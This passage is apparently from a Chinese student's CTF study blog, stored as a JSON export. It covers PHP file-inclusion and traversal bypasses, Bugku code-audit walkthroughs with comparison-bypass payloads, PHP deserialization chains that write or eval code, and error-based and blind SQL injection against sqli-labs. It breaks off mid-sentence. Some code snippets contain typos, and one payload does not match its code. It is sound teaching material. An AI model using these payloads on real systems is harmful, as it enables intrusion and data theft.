%252e%252e%252f ..\\ %252e%252e%255c 容器/服务器的编码方式 ../ ..%c0%af 注：Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/ 注：java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\\ ..%c1%9c 指定后缀接着考虑指定后缀的情况。测试代码: 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include $file.&#x27;/test/test.php&#x27;;?&gt; URLurl格式 protocol :// hostname[:port] / path / [;parameters][?query]#fragment 在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。 姿势一：query（？） 1index.php?file=http://remoteaddr/remoteinfo.txt? 则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。 姿势二：fragment（#） 1index.php?file=http://remoteaddr/remoteinfo.txt%23 则包含的文件为 http://remoteaddr/remoteinfo.txt#/test/test.php问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。 利用协议前面有提到过利用zip协议和phar协议。假设现在测试代码为： 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include $file.&#x27;/test/test.php&#x27;;?&gt; 构造压缩包, 其中test.php内容为：&lt;?php phpinfo(); ?&gt; 利用zip协议，注意要指定绝对路径 长度截断利用条件： php版本 &lt; php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ index.php?file=././././。。。省略。。。././shell.txt 则后缀/test/test.php，在达到最大值后会被直接丢弃掉。 %00截断利用条件： php版本 &lt; php 5.3.4 index.php?file=phpinfo.txt%00","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"bugku代码审计","slug":"大学CTF/bugku代码审计","date":"2019-03-27T10:05:30.000Z","updated":"2019-11-19T07:58:54.071Z","comments":true,"path":"2019/03/27/大学CTF/bugku代码审计/","link":"","permalink":"http://example.com/2019/03/27/%E5%A4%A7%E5%AD%A6CTF/bugku%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"前言想参加一波比赛，要学习一下了。","text":"前言想参加一波比赛，要学习一下了。 正文extract变量覆盖先来了解一下extract 定义和用法 extract() 函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 实例 将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c： 123456&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;?&gt; 运行结果： $a = Cat; $b = Dog; $c = Horse 然后看题目， 12345678910111213141516&lt;?php$flag=&#x27;xxx&#x27;;extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo&#x27;flag&#123;xxx&#125;&#x27;;&#125;else&#123;echo&#x27;Oh.no&#x27;;&#125;&#125;?&gt; 这里的extract函数没有设置extract_rules，而extract默认的规则是如果有冲突则覆盖掉已有的变量。 直接构造payload:?shiyan=&amp;flag strcmp比较字符串先了解一下strcmp strcmp( string $str1, string $str2) : int 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；两者相等，返回0。 PHP的strcmp()函数在PHP5.3版本之前使用数组可以绕过验证 看题目： 12345678910&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#x27;a&#x27;])) &#123;if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;No&#x27;;&#125;?&gt; 函数期望传入的类型是字符串类型的数据，要是我们传入非字符串类型的数据的话，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 。也就是说虽然报了错，但却判定其相等了，也就绕过了判断。 payload:?a[]=flag(其实只要有a[]就行) url二次编码绕过1234567891011&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;not allowed!&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;Access granted!&quot;; echo &quot;flag&quot;;&#125;?&gt; eregi()— 不区分大小写的正则表达式匹配 ①int eregi(string pattern, string string, [array regs]);eregi()函数在一个字符串搜索指定的模式的字符串，搜索不区分大小写。eregi()可以检查有效性字符串，如密码。如果匹配成功返回true，否则返回false。eregi()函数漏洞：字符串对比解析，当ereg读取字符串string时%00后面的字符串不会被解析。 具体查看ereg 题目要求id不等于hackerDJ,根据提示将hackerDJ进行url二次编码， payload：?id=hackerD%254A(只需要对一个字符进行二次编码，当然，所有衣服编码也可以) md5函数123456789101112&lt;?phperror_reporting(0);$flag = &#x27;flag&#123;test&#125;&#x27;;if (isset($_GET[&#x27;username&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;])print &#x27;Your password can not be your username.&#x27;;else if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Invalid password&#x27;;&#125;?&gt; 显然我们得使username!=password&amp;&amp;md5(username)===md5(password) 利用md5()无法处理数组的漏洞，会返回0. payload：?username[]=1&amp;password[]=2 数组返回NULL绕过123456789101112&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&#x27;password&#x27;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)echo &#x27;You password must be alphanumeric&#x27;;else if (strpos ($_GET[&#x27;password&#x27;], &#x27;--&#x27;) !== FALSE)die(&#x27;Flag: &#x27; . $flag);elseecho &#x27;Invalid password&#x27;;&#125;?&gt; **ereg()**区分大小写。^表示字符串开始，$表示字符串结束，+表示一次到多次，[a-zA-Z0-9]表示字符集。 源码分析： if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE) password值，必须是数字或字母开头， if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !== FALSE) password中包含**–**。看到eregi()函数，想到%00截断，构造payload payload1：?password=1%00-- 也可以绕过strpos函数，也可以直接用数组截断，就不要写–了。 payload2:?password[]=1 弱类型整数大小比较绕过1234$temp = $_GET[&#x27;password&#x27;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() — 检测变量是否为数字或数字字符串，数字和数字字符串则返回 TRUE，否则返回 FALSE。 is_numeric()在处理类似123abc这样的字符串时，会返回0。 payload1:?password=1337abc is_numeric()`函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断。 payload2:?password=1337%00 payload3:password=1337%20 sha()函数比较绕过12345678910111213141516171819&lt;?php$flag = &quot;flag&quot;;if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;]))&#123;var_dump($_GET[&#x27;name&#x27;]); echo &quot;&quot;;var_dump($_GET[&#x27;password&#x27;]);var_dump(sha1($_GET[&#x27;name&#x27;]));var_dump(sha1($_GET[&#x27;password&#x27;]));if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;]) echo &#x27;Your password can not be your name!&#x27;;else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag);else echo &#x27;Invalid password.&#x27;;&#125;else echo &#x27;Login first!&#x27;;?&gt; 解读源码： name不等于password&amp;他们的sha1值相等 sha()函数和md5()函数一样，都不能处理数组数据，考虑数组绕过。 payload:?name[]=1&amp;password[]=2 md5加密相等绕过123456789101112&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;echo &quot;flag&#123;*&#125;&quot;;&#125; else &#123;echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125;?&gt; md5弱比较: PHP在处理哈希字符串时，在利用”!=”或”==”来对哈希值进行比较时，会把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码处理后其哈希值都是以”0e”开头的，那么PHP将会认为它们都是0。 常见payload: QNKCDZO，240610708，s878926199a，s155964671a，s214587387a，s214587387a 直接?a=240610708 十六进制与数字比较12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = &#x27;flag&#123;test&#125;&#x27;;$one = ord(&#x27;1&#x27;); //ord — 返回字符的 ASCII 码值$nine = ord(&#x27;9&#x27;); //ord — 返回字符的 ASCII 码值$number = &#x27;3735929054&#x27;;// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET[&#x27;password&#x27;];echo noother_says_correct($temp);?&gt; $temp = $_GET[&#39;password&#39;]; $number == $temp 首先分析代码，函数要求变量$temp不能存在1~9之间的数字，最后，又要求$temp=3735929054;这本来是自相矛盾的，但php在转码时会把16进制转化为十进制. 于是把将number的值3735929054转化成十六进制，来绕过判断 payload：?password=0xdeadc0de(转化成十六进制是deadc0de，前面要加上0x表示成十六进制) 变量覆盖参考第一题 ereg正则%00截断1234567891011121314151617181920212223&lt;?php$flag = &quot;xxx&quot;;if (isset ($_GET[&#x27;password&#x27;]))&#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)&#123;echo &#x27;You password must be alphanumeric&#x27;;&#125;else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999)&#123;if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置,有的话返回第一次出现的位置，没有的话，返回false&#123;die(&#x27;Flag: &#x27; . $flag);&#125;else&#123;echo(&#x27;- have not been found&#x27;);&#125;&#125;else&#123;echo &#x27;Invalid password&#x27;;&#125;&#125;?&gt; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)要求只能有数字和字符，这里可以%00截断 if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)要求password&lt;8并且password&gt;9999999，可以用数组绕过，也可以用科学计数法绕过 if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !== FALSE)要求password中找不到’-‘，也可以数组绕过。 payload1：?password[]=1%00 payload2：?password=1e10*-* strpos数组绕过1234567891011&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&#x27;ctf&#x27;])) &#123;if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)echo &#x27;必须输入数字才行&#x27;;else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)die(&#x27;Flag: &#x27;.$flag);elseecho &#x27;骚年，继续努力吧啊~&#x27;;&#125;?&gt; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) === FALSE) ereg要求ctf是数字，用%00截断 else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) strpos要求ctf中包含’#biubiubiu‘，数组绕过。 这题中直接数组就可以了 payload：?ctf[]=1 数字验证正则绕过12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = &#x27;flag&#123;test&#125;&#x27;;if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;])&#123;$password = $_POST[&#x27;password&#x27;];if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配&#123;echo &#x27;flag&#x27;;exit;&#125;while (TRUE)&#123;$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;if (6 &gt; preg_match_all($reg, $password, $arr))break;$c = 0;$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上if (&quot;42&quot; == $password) echo $flag;else echo &#x27;Wrong password&#x27;;exit;&#125;&#125;?&gt; preg_match用法 1int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) 搜索 subject 与 pattern 给定的正则表达式的一个匹配。 参数说明： $pattern: 要搜索的模式，字符串形式。 $subject: 输入字符串。 $matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。 $flags：flags 可以被设置为以下标记值： PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。 offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。 返回值 返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 还是没看懂。。。。。。 看别人写的 preg_match(‘/^[[:graph:]]{12,}$/‘, $password)即匹配password中除空格和tab键之外的字符12次以上，那如果我们传进去的password长度小于12或者是数组的话，preg_match返回的就是0，就能输出flag payload:`password[]=’ 要用$_POST提交。 简单的waf这题好像GG了。 这样的话代码审计就做完了。","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"php序列化与反序列化","slug":"大学CTF/php序列化与反序列化","date":"2019-03-26T10:52:30.000Z","updated":"2019-05-21T09:33:57.100Z","comments":true,"path":"2019/03/26/大学CTF/php序列化与反序列化/","link":"","permalink":"http://example.com/2019/03/26/%E5%A4%A7%E5%AD%A6CTF/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"前言打算考研了，没时间学习这些知识了，只能抽时间总结一下。","text":"前言打算考研了，没时间学习这些知识了，只能抽时间总结一下。 正文参考链接 序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。 PHP中的两个函数，序列化函数serialize()和反序列化函数unserialize() 简介**serialize()**——将PHP中的变量如对象(Object)、数组(Array)等序列化为字符串. **unserialize()**——将序列化的字符串转换为原先的值. PHP手册上的说明： 想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。serialize() 可处理除了 resource 之外的任何类型。甚至可以 serialize() 那些包含了指向其自身引用的数组。serialize() 的数组／对象中的引用也将被存储。 当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。 详情可以查看PHP手册 serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下: 123456789&lt;?phpclass specter&#123; var $test=&#x27;123&#x27;;&#125;$class1=new specter();$class1_serialize=serialize($class1);print_r($class1_serialize);?&gt; 这样就可以把specter这个对象给序列化，然后打印出来 O:7:”specter”:1:{s:4:”test”;s:3:”123”;} 然后介绍一下格式以及意义： O表示对象(Object),如果是数组序列化后，则O变成a(array) 7表示对象有7个字符 specter表示对象名称 1表示有一个值 s表示字符串 4表示字符串长度 unserialize()与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。 测试代码： 12345678910&lt;?phpclass specter&#123; var &amp;test=&#x27;123&#x27;;&#125;$class2=&#x27;O:7:&quot;specter&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&#x27;;print_r(class2);echo &quot;&lt;/br&gt;&quot;;class2_unserialize=unserizlize($class2);print_r(&amp;class2_unserialize);?&gt; 输出如下： O:7:”specter”:1:{s:4:”test”;s:3:”123”;}specter Object ( [test] =&gt; 123 ) 反序列化漏洞由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 介绍几个magic函数 __construct() __contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数 __destruct() __destruct()函数被称为析构函数，当类结束的时候自动调用该函数 __sleep() __sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 __wakeup() __wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数 __toString() __toString()函数是当对象被当做字符串的时候会自动调用该函数 测试一下： 123456789101112131415161718192021222324&lt;?phpclass specter&#123; var $test=&#x27;123&#x27;; function __wakeup()&#123; echo &quot;__wakeup&quot;; echo &quot;&lt;/br&gt;&quot;; &#125; function __construct()&#123; echo &quot;__construct&quot;; echo &quot;&lt;/br&gt;&quot;; &#125; function __destruct()&#123; echo &quot;__destruct&quot;; echo &quot;&lt;/br&gt;&quot;; &#125;&#125;$class2=&#x27;O:7:&quot;specter&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&#x27;;print_r($class2);echo &quot;&lt;/br&gt;&quot;;$class2_unserialize=unserialize($class2);print_r($class2_unserialize);echo &quot;&lt;/br&gt;&quot;;?&gt; 利用场景由上图可以看到，unserialize()后会导致__wakeup()或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup()或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup()场景做个实验。创建一个空的文件shell.php，假设服务器index.php源码如下： 12345678910111213141516&lt;?phpclass specter&#123; var $test = &#x27;123&#x27;; function __wakeup()&#123; $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET[&#x27;test&#x27;];print_r($class3);echo &quot;&lt;/br&gt;&quot;;$class3_unser = unserialize($class3);require &quot;shell.php&quot;;// 为显示效果，把这个shell.php包含进来?&gt; 把test的赋值为&lt;?php phpinfo(); ?&gt;, 1234567891011121314&lt;?phpclass specter&#123; var $test = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;; function __wakeup()&#123; $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class4 = new specter();$class4_ser = serialize($class4); print_r($class4_ser);?&gt; 得到 O:7:”specter”:1:{s:4:”test”;s:19:””;} 构造payload： O:7:”specter”:1:{s:4:”test”;s:19:”“;} 可以看出利用成功，shell.php中也写入了test的值. 再看一个例子 123456789101112131415161718192021222324//index.php&lt;?phpclass Specter&#123; public $a; function __construct()&#123; $this-&gt;a=new A(); //this是一个A类对象 &#125; function __destruct()&#123; $this-&gt;a-&gt;action(); //将会执行A类的action() &#125;&#125;class A&#123; function action()&#123; echo &#x27;hello world&#x27;; &#125;&#125;class B&#123; var $b; function action()&#123; eval($this-&gt;b); &#125;&#125;unserialize($_GET[&#x27;value&#x27;]);?&gt; 这里面也涉及到一个命令执行函数**eval()**，上面的代码执行反序列化之后，会调用__destruct函数，输出hello world，那么我该如何构造我们的反序列化语句呢。 我们需要利用B类的action()函数，只要使变量b是我们的php命令，通过eval函数，就可以执行这个命令了。 构造序列化如下 12345678910111213141516&lt;?phpclass Specter&#123; public $a; function __construct()&#123; $this-&gt;a=new B(); //将变量a等于B类对象，从而调用B累的action &#125;&#125;class B&#123; var $b=&#x27;phpinfo();&#x27;; //使b等于我们的命令 function action()&#123; eval($this-&gt;b); &#125;&#125;$specter=new Specter();print_r(serialize($specter))?&gt; 输出payload：O:7:&quot;Specter&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 其他Magic function的利用但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 1234567891011121314151617181920&lt;?phpclass test1&#123; function __construct($test)&#123; $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ; fwrite($fp,$test); fclose($fp); &#125;&#125;class test2&#123; var $test = &#x27;123&#x27;; function __wakeup()&#123; $obj = new test1($this-&gt;test); &#125;&#125;$class5 = $_GET[&#x27;test&#x27;];print_r($class5);echo &quot;&lt;/br&gt;&quot;;$class5_unser = unserialize($class5);require &quot;shell.php&quot;;?&gt; 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new test1()会自动调用对象test1中的__construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 shell.php中。 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。 12345678910111213141516171819202122232425&lt;?php class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test2(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test2&#123; function action()&#123; echo &quot;Test2&quot;; &#125;&#125;class Test3&#123; var $test3; function action()&#123; eval($this-&gt;test3); &#125;&#125;$test = new Test1();unserialize($_GET[&#x27;test&#x27;]);?&gt; test=new Test1()，会执行__construct()，然后又new了一个Test2()，执行完后，又会执行__destruct()，在调用action()，输出Test2. 构造payload： 1234567891011121314&lt;?phpclass Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test3(); &#125;&#125;class Test3&#123; var $test3 = &quot;phpinfo();&quot;;&#125;$t_ser=serialize(new Test1());print_r($t_ser);?&gt; 得到payload： O:5:”Test1”:1:{s:5:”test1”;O:5:”Test2”:1:{s:5:”test3”;s:10:”phpinfo();”;}} 还看到一篇关于[session反序列化的(https://blog.csdn.net/nzjdsds/article/details/82703639) 参考1 参考2","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"SQL注入之双查询注入","slug":"大学CTF/SQL注入之双查询注入","date":"2019-03-05T07:15:59.000Z","updated":"2019-03-05T08:45:00.846Z","comments":true,"path":"2019/03/05/大学CTF/SQL注入之双查询注入/","link":"","permalink":"http://example.com/2019/03/05/%E5%A4%A7%E5%AD%A6CTF/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/","excerpt":"前言在做sqlilabs时，了解到的东西，写一下，把学到的总结一下，以后方便看","text":"前言在做sqlilabs时，了解到的东西，写一下，把学到的总结一下，以后方便看 子查询在说双查询之前，先介绍一下子查询。 查询：任何SQL语句都是查询。但此术语一般指SELECT语句。SQL还允许创建子查询（subquery），即嵌套在其他查询中的查询。 举个简单的例子，Select concat((select database()));执行的时候，先从子查询进行。因此执行select database()这个语句就会把当前的数据库的名称查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如数据库名字叫’a’和’b’，那么concat(‘a’,’b’)后，结果就是ab了。 介绍几个函数和语句： rand()函数 //返回0~1间的小数。 floor()函数 //向下取整。向上取整：ceiling() count()函数 //返回匹配指定条件的行数。 group by子句 //根据一个或多个列对结果集进行分组。 双查询注入原理当在一个聚合函数，比如count()函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 select floor(rand()*2)rand()返回0~1间的数，*2之后向下取整后不是0就是1 用concat_ws()将子查询的结果连接，select concat((select database()),floor(rand()\\*2))可以看到返回结果中有数据库名，注意数据库的名字并不是叫security1和security0，而是数据库名连接的select floor(rand()*2)生成的0或1. 如果在这条语句后面加上from一个表名，那么会返回security0或security1的一个集合，数目是由表本身有几条结果决定的： select concat((select database()),floor(rand()\\*2)) from users; 这样看来，如果是从information_schema.schemata里，这个表包含了mysql的所有数据库名，则会返回数据库数个结果。我们使用information_schema.tables或者information_schema.columns两个表来查询想要的信息。把concat((select database()),floor(rand()\\*2))这个结果取了一个别名a，然后使用它进行分组。这样相同的security0分到一组，security1分到一组,就剩下两个结果了这里的database()可以替换成任何想查的函数，比如version()，user()等。 最后一步，使报错中显示想要查询的结果：分别查看database(),version(),user() select count(\\*),concat((select database()),floor(rand()\\*2)) as a from information_schema.tables group by a;select count(\\*),concat((select version()),floor(rand()\\*2)) as a from information_schema.tables group by a;select count(\\*),concat((select user()),floor(rand()\\*2)) as a from information_schema.tables group by a; 原文链接","categories":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"SQL注入之盲注","slug":"大学CTF/SQL注入之盲注","date":"2019-03-05T07:15:20.000Z","updated":"2019-03-11T11:35:16.813Z","comments":true,"path":"2019/03/05/大学CTF/SQL注入之盲注/","link":"","permalink":"http://example.com/2019/03/05/%E5%A4%A7%E5%AD%A6CTF/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/","excerpt":"前言在做sqlilabs时，了解到的东西，写一下，把学到的总结一下，以后方便看","text":"前言在做sqlilabs时，了解到的东西，写一下，把学到的总结一下，以后方便看 盲注盲注是指在SQL注入的过程中，执行选择的语句不会正确回显到前段页面，需要我们利用一些方法判断或尝试，这个过程称为盲注。 盲注又分为了以下三种：1.布尔型盲注：根据页面返回的真假来判断的即为布尔型盲注2.时间型盲注：根据页面返回的时间来判断的即为时间型盲注3.报错型盲注：根据页面返回的对错来判断的即为报错型盲注 可以看一下这篇文章https://www.freebuf.com/articles/web/30841.html 这道题输入**?id=1’**,报错 输入**?id=1’–+,返回you are in…**， 以sqlilabs的Less-5为例。 下面是转的，我一个同学写的原文链接 布尔型盲注1、利用 left() 函数得到数据库名 left()函数 left(database(),1)&gt;’s’ //left()函数 left(a,b) 从左截取a的前b位 此时想得到信息可以尝试?id=1&#39; and left(version(),1)=5--+ 如果版本号第一个数字是5则会返回You are in，如果错误的话则不能正确的返回You are in，比如?id=1&#39; and left(version(),1)=6--+，则无法正确回显。继续进行下去可以盲注出更多信息?id=1’ and left(version(),4)=concat(‘5.7.’)–+ 。看一下数据库名的长度?id=1&#39; and length(database())=8--+，可以正确回显，说明数据库名长度就是8，接下来爆数据库名?id=1&#39; and left(database(),1)&gt;&#39;a&#39;--+，这个数据库第一个字母是s，显然成立，具体不知道时可以用二分法，接下来爆第二位?id=1&#39; and left(database(),2)&gt;&#39;sa&#39;--+ 可以一步步爆出所有字段。 2、利用 substr() , ascii() 函数得到表名 substr()函数 ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1),1,1))=101–+ substr(a,b,c) 从b位置开始，截取字符串a的c长度， ascii()函数 ascii(substr((select database()),1,1))=98 ascii() 将单个字符转换为ascii码值 前面已经得到数据库名为security ，接下里爆表：?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+ ，当然，这里的 database() 也可以换成 security ，作用是相同的。一步步改变 substr()即可爆出第一个表为 emails。改变 limit() 参数即可爆出所有表。此处也可以不用 ascii() 函数，?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)=&#39;ea&#39;同样可以实现要求。 limit limit是mysql的语法select * from table limit m,n其中m是指记录开始的index，从0开始，表示第一条记录。n是指从第m+1条开始，取n条。select * from tablename limit 2,4即取出第3条至第6条，4条记录注入时一般只能返回一条记录，否者会报Subquery returns more than 1 row，所以可以改变m，但n的话保持是1即可. 3、利用 regexp() 函数得到列名 regexp正则注入 select user() regexp ‘^[a-z]’;，这样会匹配user为root，如果正确返回1，那么… regexp ‘^ro’ 则可以匹配第二位。 接下来爆users表的列名，?id=1&#39; and 